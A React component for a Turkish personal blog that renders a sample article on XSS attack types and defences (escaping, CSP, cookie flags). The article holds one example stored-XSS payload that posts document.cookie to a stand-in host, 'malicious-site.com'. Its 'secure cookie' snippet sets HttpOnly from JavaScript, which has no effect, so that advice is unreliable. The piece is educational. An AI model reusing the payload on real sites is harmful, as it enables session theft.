
import { useParams, Link } from "react-router-dom";
import { motion } from "framer-motion";
import { Card, CardContent } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Calendar, User, ArrowLeft, Clock } from "lucide-react";
import ReactMarkdown from "react-markdown";
import { Prism as SyntaxHighlighter } from "react-syntax-highlighter";
import { oneDark } from "react-syntax-highlighter/dist/esm/styles/prism";

const BlogPost = () => {
  const { id } = useParams();

  // Örnek blog yazısı (gerçek uygulamada API'den gelecek)
  const post = {
    id: "1",
    title: "Web Uygulamalarında XSS Saldırıları ve Korunma Yöntemleri",
    category: "Web Application Security",
    date: "2024-01-15",
    author: "Sen",
    readTime: "8 dakika",
    content: `# Web Uygulamalarında XSS Saldırıları ve Korunma Yöntemleri

Cross-Site Scripting (XSS) saldırıları, web güvenliğinin en yaygın ve tehlikeli tehditlerinden biridir. Bu yazıda XSS saldırılarının türlerini, nasıl çalıştığını ve etkili korunma yöntemlerini inceleyeceğiz.

## XSS Nedir?

XSS, saldırganların web uygulamalarına kötü amaçlı JavaScript kodu enjekte etmesine olanak tanıyan bir güvenlik açığıdır. Bu kodlar, kullanıcının tarayıcısında çalışarak hassas bilgilerin çalınmasına neden olabilir.

## XSS Türleri

### 1. Stored XSS (Kalıcı XSS)
Kötü amaçlı kod doğrudan sunucuda saklanır ve her kullanıcı o sayfayı ziyaret ettiğinde çalışır.

\`\`\`javascript
// Örnek zarar verici kod
<script>
  // Kullanıcının cookie'lerini çal
  fetch('http://malicious-site.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>
\`\`\`

### 2. Reflected XSS (Yansıyan XSS)
Kötü amaçlı kod URL parametresi olarak gönderilir ve sunucu tarafından yansıtılır.

### 3. DOM-based XSS
Saldırı tamamen client-side'da gerçekleşir ve DOM manipülasyonu yoluyla çalışır.

## Korunma Yöntemleri

### 1. Input Validation (Giriş Doğrulama)
\`\`\`javascript
function validateInput(input) {
  // HTML karakterlerini escape et
  return input
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}
\`\`\`

### 2. Content Security Policy (CSP)
\`\`\`html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
\`\`\`

### 3. HttpOnly ve Secure Cookies
\`\`\`javascript
// Güvenli cookie ayarlama
document.cookie = "sessionId=abc123; HttpOnly; Secure; SameSite=Strict";
\`\`\`

## Sonuç

XSS saldırıları ciddi güvenlik tehditleri oluşturabilir. Düzenli güvenlik testleri, input validation ve CSP gibi koruma mekanizmalarını implement ederek bu tehditlere karşı korunabiliriz.

**Unutmayın:** Güvenlik, bir hedef değil sürekli bir süreçtir.`
  };

  const getCategoryColor = (category: string) => {
    switch(category) {
      case "Web Application Security":
        return "bg-red-100 text-red-800";
      case "Frontend Tech":
        return "bg-blue-100 text-blue-800";
      default:
        return "bg-gray-100 text-gray-800";
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50">
      {/* Header */}
      <header className="border-b bg-white/80 backdrop-blur-sm sticky top-0 z-50">
        <div className="container mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <motion.h1 
              initial={{ opacity: 0, y: -20 }}
              animate={{ opacity: 1, y: 0 }}
              className="text-2xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent"
            >
              Kişisel Blog
            </motion.h1>
            <nav className="flex gap-6">
              <Link to="/" className="text-gray-700 hover:text-blue-600 transition-colors">Ana Sayfa</Link>
              <Link to="/about" className="text-gray-700 hover:text-blue-600 transition-colors">Hakkımda</Link>
            </nav>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-6 py-8">
        {/* Back Button */}
        <motion.div
          initial={{ opacity: 0, x: -20 }}
          animate={{ opacity: 1, x: 0 }}
          className="mb-8"
        >
          <Link 
            to="/" 
            className="inline-flex items-center gap-2 text-blue-600 hover:text-blue-800 transition-colors"
          >
            <ArrowLeft className="w-4 h-4" />
            Geri Dön
          </Link>
        </motion.div>

        <div className="max-w-4xl mx-auto">
          {/* Article Header */}
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6 }}
          >
            <Card className="mb-8 bg-white/80 backdrop-blur-sm border-0 shadow-xl">
              <CardContent className="p-8">
                <div className="mb-4">
                  <Badge className={getCategoryColor(post.category)}>
                    {post.category}
                  </Badge>
                </div>
                
                <h1 className="text-3xl md:text-4xl font-bold text-gray-900 mb-6 leading-tight">
                  {post.title}
                </h1>
                
                <div className="flex flex-wrap items-center gap-6 text-gray-600">
                  <div className="flex items-center gap-2">
                    <Calendar className="w-4 h-4" />
                    {new Date(post.date).toLocaleDateString('tr-TR')}
                  </div>
                  <div className="flex items-center gap-2">
                    <User className="w-4 h-4" />
                    {post.author}
                  </div>
                  <div className="flex items-center gap-2">
                    <Clock className="w-4 h-4" />
                    {post.readTime}
                  </div>
                </div>
              </CardContent>
            </Card>
          </motion.div>

          {/* Article Content */}
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.3, duration: 0.6 }}
          >
            <Card className="bg-white/80 backdrop-blur-sm border-0 shadow-xl">
              <CardContent className="p-8">
                <div className="prose prose-lg max-w-none">
                  <ReactMarkdown
                    components={{
                      code({node, inline, className, children, ...props}) {
                        const match = /language-(\w+)/.exec(className || '');
                        return !inline && match ? (
                          <SyntaxHighlighter
                            style={oneDark}
                            language={match[1]}
                            PreTag="div"
                            {...props}
                          >
                            {String(children).replace(/\n$/, '')}
                          </SyntaxHighlighter>
                        ) : (
                          <code className={className} {...props}>
                            {children}
                          </code>
                        );
                      },
                      h1: ({children}) => <h1 className="text-3xl font-bold text-gray-900 mt-8 mb-4">{children}</h1>,
                      h2: ({children}) => <h2 className="text-2xl font-bold text-gray-900 mt-6 mb-3">{children}</h2>,
                      h3: ({children}) => <h3 className="text-xl font-bold text-gray-900 mt-4 mb-2">{children}</h3>,
                      p: ({children}) => <p className="text-gray-700 leading-relaxed mb-4">{children}</p>,
                      strong: ({children}) => <strong className="font-bold text-gray-900">{children}</strong>,
                    }}
                  >
                    {post.content}
                  </ReactMarkdown>
                </div>
              </CardContent>
            </Card>
          </motion.div>
        </div>
      </div>
    </div>
  );
};

export default BlogPost;
